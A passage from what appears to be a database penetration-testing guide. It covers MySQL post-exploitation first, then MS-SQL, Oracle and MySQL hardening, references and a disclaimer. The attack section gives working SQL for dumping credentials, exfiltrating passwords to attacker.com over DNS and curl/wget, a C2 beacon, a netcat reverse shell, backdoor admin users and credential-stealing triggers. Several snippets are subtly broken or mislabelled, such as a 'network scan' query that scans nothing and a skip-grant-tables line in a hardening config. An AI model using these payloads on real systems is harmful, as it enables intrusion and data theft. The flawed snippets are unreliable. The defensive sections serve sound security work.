-- Dump sensitive tables
SELECT * FROM users;
SELECT * FROM accounts;
SELECT * FROM credentials;
```

### 4. Privilege Escalation

**Check Current Privileges:**
```sql
-- Check current user
SELECT USER(), CURRENT_USER(), SYSTEM_USER();

-- Check privileges
SELECT * FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(),'@',1);

-- Show detailed grants
SHOW GRANTS FOR CURRENT_USER();
```

**Escalation Techniques:**

**1. Exploit Race Conditions in GRANT:**
```sql
-- If user has GRANT OPTION, can grant themselves additional privileges
GRANT ALL PRIVILEGES ON *.* TO 'current_user'@'%';
FLUSH PRIVILEGES;
```

**2. Exploit Weak Credentials:**
```sql
-- Try default/weak passwords
-- Common MySQL defaults: root with no password, root/root, root/password

-- Brute force user accounts
SELECT user, host FROM mysql.user WHERE password = PASSWORD('password123');
```

**3. Abuse Stored Procedures:**
```sql
-- If user can create procedures with SQL SECURITY DEFINER
CREATE PROCEDURE escalate_privs()
SQL SECURITY DEFINER
BEGIN
    -- Execute with definer's (higher) privileges
    GRANT ALL ON *.* TO 'low_priv_user'@'%';
END;

CALL escalate_privs();
```

### 5. Data Exfiltration Techniques

**DNS Exfiltration:**
```sql
-- Exfiltrate data via DNS queries (Windows)
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'));

-- Linux (if DNS resolution works in LOAD_FILE)
SELECT LOAD_FILE(CONCAT('//', (SELECT password FROM users LIMIT 1), '.attacker.com/file'));
```

**HTTP Exfiltration (with UDF):**
```sql
-- Using sys_exec with curl
SELECT sys_exec(CONCAT(
    'curl http://attacker.com/exfil?data=',
    (SELECT GROUP_CONCAT(CONCAT(username,':',password)) FROM users)
));

-- Using wget
SELECT sys_exec(CONCAT(
    'wget --post-data="data=',
    (SELECT GROUP_CONCAT(password) FROM users),
    '" http://attacker.com/exfil'
));
```

**File-based Exfiltration:**
```sql
-- Write sensitive data to web-accessible location
SELECT * FROM sensitive_table
INTO OUTFILE '/var/www/html/data.txt';

-- Then download via HTTP: http://victim.com/data.txt
```

### 6. Lateral Movement

**Exploit Replication:**
```sql
-- If user has REPLICATION SLAVE privilege
-- Check replication status
SHOW SLAVE STATUS;
SHOW MASTER STATUS;

-- Get replication credentials
SELECT user, host, password FROM mysql.user WHERE Repl_slave_priv = 'Y';
```

**Network Scanning via MySQL:**
```sql
-- Port scan using connection attempts
-- If remote host is up and MySQL port is open, connection succeeds
SELECT 1 FROM DUAL WHERE EXISTS (
    SELECT 1 FROM mysql.user WHERE host = '192.168.1.100'
);

-- Attempt connections to scan network
-- Failed connections may reveal information about network topology
```

### 7. Persistence Mechanisms

**Backdoor User:**
```sql
-- Create backdoor user with ALL privileges
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'ComplexP@ssw0rd123!';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

-- Create user with wildcards to accept any password
-- (Older MySQL versions with authentication bypass bugs)
CREATE USER 'backdoor'@'%' IDENTIFIED BY '';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';
```

**Malicious Triggers:**
```sql
-- Create trigger for persistence/logging
CREATE TRIGGER backdoor_trigger
BEFORE INSERT ON users
FOR EACH ROW
BEGIN
    -- Log credentials when new users are created
    INSERT INTO backdoor_log VALUES (NEW.username, NEW.password, NOW());
END;

-- Trigger for command execution (if UDF available)
CREATE TRIGGER exec_trigger
AFTER INSERT ON target_table
FOR EACH ROW
BEGIN
    -- Execute backdoor on specific insert
    IF NEW.id = 1337 THEN
        SET @result = sys_exec('backdoor command');
    END IF;
END;
```

**Event Scheduler:**
```sql
-- Enable event scheduler
SET GLOBAL event_scheduler = ON;

-- Create malicious event
CREATE EVENT backdoor_event
ON SCHEDULE EVERY 1 HOUR
DO
    BEGIN
        -- Execute backdoor code periodically
        -- If UDF available:
        SET @result = sys_exec('curl http://c2.attacker.com/beacon');
    END;

-- List events
SHOW EVENTS;
SELECT * FROM information_schema.events;
```

**Write to startup files:**
```sql
-- Write to MySQL init file (if writable)
SELECT '#!/bin/bash\nnc attacker.com 4444 -e /bin/bash' 
INTO OUTFILE '/etc/mysql/mysql.conf.d/backdoor.cnf';

-- Write to /etc/init.d/ or systemd service files
SELECT '[Service]\nExecStart=/tmp/backdoor.sh\n' 
INTO OUTFILE '/etc/systemd/system/backdoor.service';
```

### 8. MySQL-Specific Attack Vectors

**Second-Order SQL Injection:**
```sql
-- Store payload that gets executed later
INSERT INTO users (username) VALUES ('admin'' OR ''1''=''1');

-- When username is used in query without escaping
-- Original: SELECT * FROM data WHERE owner = 'admin' OR '1'='1'
```

**Charset-based Attacks:**
```sql
-- Using multi-byte character sets for bypasses
SET NAMES 'gbk';
-- Then payload: %df' OR 1=1 --
-- %df%27 becomes a valid GBK character, bypassing addslashes
```

---

## Mitigation Strategies

### General Security Principles

1. **Principle of Least Privilege**
   - Database accounts should have minimal required privileges
   - Application should not use DBA/SA accounts
   - Separate read-only and write accounts

2. **Input Validation and Sanitization**
   - Use parameterized queries/prepared statements
   - Validate all user input on server-side
   - Whitelist acceptable input patterns

3. **Network Segmentation**
   - Database should not have direct internet access
   - Implement firewall rules restricting database network access
   - Use VLANs to isolate database servers

### MS-SQL Specific Mitigations

**Disable Dangerous Features:**
```sql
-- Disable xp_cmdshell (most important)
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- Disable OLE Automation
EXEC sp_configure 'Ole Automation Procedures', 0;
RECONFIGURE;

-- Disable Ad Hoc Distributed Queries
EXEC sp_configure 'Ad Hoc Distributed Queries', 0;
RECONFIGURE;

-- Disable CLR integration if not needed
EXEC sp_configure 'clr enabled', 0;
RECONFIGURE;
```

**Harden Permissions:**
```sql
-- Remove public execute permissions on dangerous procedures
REVOKE EXECUTE ON xp_cmdshell FROM PUBLIC;
REVOKE EXECUTE ON xp_regread FROM PUBLIC;
REVOKE EXECUTE ON xp_regwrite FROM PUBLIC;
REVOKE EXECUTE ON sp_OACreate FROM PUBLIC;

-- Audit and remove unnecessary logins
SELECT name FROM sys.server_principals WHERE type IN ('S','U');

-- Disable SQL Server Browser if not needed
-- Monitor for suspicious sp_configure changes
```

**Enable Auditing:**
```sql
-- Enable SQL Server Audit
CREATE SERVER AUDIT SecurityAudit TO FILE (FILEPATH = 'C:\SQLAudit\');
ALTER SERVER AUDIT SecurityAudit WITH (STATE = ON);

-- Audit dangerous events
CREATE SERVER AUDIT SPECIFICATION DangerousCommands
FOR SERVER AUDIT SecurityAudit
ADD (DATABASE_PRINCIPAL_IMPERSONATION_GROUP),
ADD (SCHEMA_OBJECT_ACCESS_GROUP);
```

### Oracle Specific Mitigations

**Restrict Java Permissions:**
```sql
-- Revoke Java permissions
BEGIN
    DBMS_JAVA.REVOKE_PERMISSION(
        'PUBLIC',
        'SYS:java.io.FilePermission',
        '<<ALL FILES>>',
        'execute'
    );
END;
/

-- Disable Java in Oracle (if not required)
-- Set JAVA_JIT_ENABLED = FALSE in init parameters
```

**Limit Network Access:**
```sql
-- Remove or restrict ACL permissions
BEGIN
    DBMS_NETWORK_ACL_ADMIN.DROP_ACL(acl => 'network_acl.xml');
END;
/

-- Create restrictive ACL
BEGIN
    DBMS_NETWORK_ACL_ADMIN.CREATE_ACL(
        acl => 'restricted_acl.xml',
        description => 'Restricted network access',
        principal => 'APP_USER',
        is_grant => TRUE,
        privilege => 'connect',
        start_date => NULL,
        end_date => NULL
    );
    
    -- Only allow specific hosts
    DBMS_NETWORK_ACL_ADMIN.ASSIGN_ACL(
        acl => 'restricted_acl.xml',
        host => 'trusted-server.example.com'
    );
END;
/
```

**Disable Dangerous Packages:**
```sql
-- Revoke execute from PUBLIC on dangerous packages
REVOKE EXECUTE ON UTL_FILE FROM PUBLIC;
REVOKE EXECUTE ON UTL_TCP FROM PUBLIC;
REVOKE EXECUTE ON UTL_HTTP FROM PUBLIC;
REVOKE EXECUTE ON UTL_SMTP FROM PUBLIC;
REVOKE EXECUTE ON DBMS_JAVA FROM PUBLIC;
REVOKE EXECUTE ON DBMS_SCHEDULER FROM PUBLIC;

-- Only grant to specific users who need them
GRANT EXECUTE ON UTL_FILE TO trusted_user;
```

**Audit Configuration:**
```sql
-- Enable unified auditing (Oracle 12c+)
AUDIT POLICY ora_database_parameter;
AUDIT POLICY ora_secureconfig;

-- Audit dangerous operations
AUDIT EXECUTE ON UTL_FILE BY ACCESS;
AUDIT EXECUTE ON DBMS_JAVA BY ACCESS;
AUDIT EXECUTE ON DBMS_SCHEDULER BY ACCESS;

-- Review audit logs regularly
SELECT * FROM unified_audit_trail 
WHERE dbusername NOT IN ('SYS','SYSTEM')
ORDER BY event_timestamp DESC;
```

### MySQL Specific Mitigations

**Restrict File Operations:**
```sql
-- Set secure_file_priv to restrict file operations
-- In my.cnf or my.ini:
[mysqld]
secure_file_priv=/var/lib/mysql-files/

-- Disable local_infile
[mysqld]
local_infile=0

-- Or dynamically:
SET GLOBAL local_infile = 0;

-- Remove FILE privilege from application users
REVOKE FILE ON *.* FROM 'app_user'@'%';
```

**Disable Dangerous Features:**
```sql
-- Remove dangerous UDFs if present
DROP FUNCTION IF EXISTS sys_exec;
DROP FUNCTION IF EXISTS sys_eval;
DROP FUNCTION IF EXISTS lib_mysqludf_sys_info;

-- Restrict plugin directory permissions
-- chown root:mysql /usr/lib/mysql/plugin
-- chmod 750 /usr/lib/mysql/plugin

-- Disable LOAD DATA LOCAL INFILE in application connections
-- Use connection string: mysql://user:pass@host/db?local_infile=0
```

**Limit Privileges:**
```sql
-- Application users should have minimal privileges
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE, DELETE ON app_database.* TO 'app_user'@'localhost';

-- No FILE, PROCESS, SUPER, or GRANT privileges
-- Use separate admin account for maintenance

-- Review and remove excessive privileges
SELECT user, host, File_priv, Process_priv, Super_priv 
FROM mysql.user 
WHERE user NOT IN ('root','mysql.sys','mysql.session');
```

**Harden Configuration:**
```ini
# my.cnf security settings
[mysqld]
# Disable symbolic links
symbolic-links=0

# Restrict network binding
bind-address=127.0.0.1

# Enable query logging for monitoring
general_log=1
general_log_file=/var/log/mysql/general.log

# Enable slow query log
slow_query_log=1
long_query_time=2

# Restrict LOAD DATA
secure_file_priv=/var/lib/mysql-files/
local_infile=0

# Disable user defined functions loading
--skip-grant-tables (never use in production!)
```

### Application-Level Protections

**Use Parameterized Queries:**

**PHP (PDO):**
```php
// GOOD - Parameterized query
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ?');
$stmt->execute([$username]);

// BAD - String concatenation
$query = "SELECT * FROM users WHERE username = '$username'";
$result = $pdo->query($query);
```

**Python:**
```python
# GOOD - Parameterized query
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

# BAD - String formatting
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
```

**Java:**
```java
// GOOD - PreparedStatement
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ?");
stmt.setString(1, username);
ResultSet rs = stmt.executeQuery();

// BAD - Statement with concatenation
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("SELECT * FROM users WHERE username = '" + username + "'");
```

**Web Application Firewall (WAF):**
- Deploy WAF to detect and block SQL injection attempts
- Use signatures for common SQL injection patterns
- Enable learning mode to baseline normal application behavior
- Regularly update WAF rules

**Defense in Depth:**
1. Input validation (whitelist approach)
2. Parameterized queries
3. Least privilege database accounts
4. Network segmentation
5. Regular security updates
6. Intrusion detection systems
7. Database activity monitoring
8. Regular security assessments

---

## References

### MS-SQL Resources

- [Microsoft SQL Server Security Best Practices](https://docs.microsoft.com/en-us/sql/relational-databases/security/security-best-practices)
- [NetSPI SQL Server Privilege Escalation](https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-privilege-escalation/)
- [SQL Server xp_cmdshell Documentation](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)
- [HackTricks - MSSQL Post Exploitation](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)

### Oracle Resources

- [Oracle Database Security Guide](https://docs.oracle.com/en/database/oracle/oracle-database/19/dbseg/)
- [Red Team Notes - Oracle Database](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets/oracle-database-commands-cheatsheet)
- [Oracle Java Stored Procedures](https://docs.oracle.com/en/database/oracle/oracle-database/19/jjdev/calling-Java-from-database-triggers.html)
- [Oracle Post-Exploitation - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener)

### MySQL Resources

- [MySQL Security Guide](https://dev.mysql.com/doc/refman/8.0/en/security.html)
- [MySQL UDF Exploitation](https://www.exploit-db.com/papers/44139)
- [Pure-PWNage MySQL Security](https://pure-l0g1c.github.io/blog/pentesting/sql_pentest/)
- [HackTricks MySQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql)

### General SQL Injection

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PentestMonkey SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

### Security Tools

- **sqlmap**: Automated SQL injection exploitation tool
- **SQLNinja**: MS-SQL specific exploitation tool
- **NoSQLMap**: NoSQL database exploitation
- **Metasploit**: Database post-exploitation modules
- **Empire**: PowerShell post-exploitation framework (for MS-SQL)

### Books

- "SQL Injection Attacks and Defense" by Justin Clarke
- "The Database Hacker's Handbook" by David Litchfield et al.
- "Penetration Testing: A Hands-On Introduction to Hacking" by Georgia Weidman

---

## Legal Disclaimer

This documentation is provided for educational and authorized security testing purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing any systems you do not own. The techniques described should only be used:

- On systems you own or have explicit written permission to test
- In authorized security assessments and penetration testing engagements
- For educational purposes in controlled lab environments
- To understand and implement proper defensive measures

The authors and contributors are not responsible for misuse of this information.
